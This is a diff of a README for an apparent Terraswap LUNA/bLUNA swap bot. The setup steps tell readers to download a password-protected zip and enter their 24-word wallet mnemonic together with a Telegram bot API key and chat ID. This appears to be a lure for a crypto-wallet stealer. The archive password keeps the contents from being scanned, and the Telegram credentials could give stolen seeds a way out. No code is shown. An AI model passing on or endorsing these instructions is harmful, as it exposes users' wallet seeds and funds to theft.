@@ -9,11 +9,8 @@ Simple tool for auto swap LUNA/bLUNA on Terraswap
 
 ### Setup
 1. [Download](https://github.com/NFTERA/terraswap-bot/archive/refs/heads/main.zip) repo and extract files with password `v7YFTTBJAdwH7n`
-
 2. Create your own Telegram bot in BotFather. You need to get your `API key` and `chat ID` (check google for instructions).
-
-3. Launch bot and set 24-word mnemonic phrase and API key. Paste `chat ID` after `API key` (must be seporated by ':'): `numbers:symbols:chat_id`
-
+3. Launch bot and set 24-word mnemonic phrase and API key. Paste `chat ID` after `API key` (must be seporated by `:`): `numbers:symbols:chat_id`
 4. Then you can start bot. 
 
 ### Donations
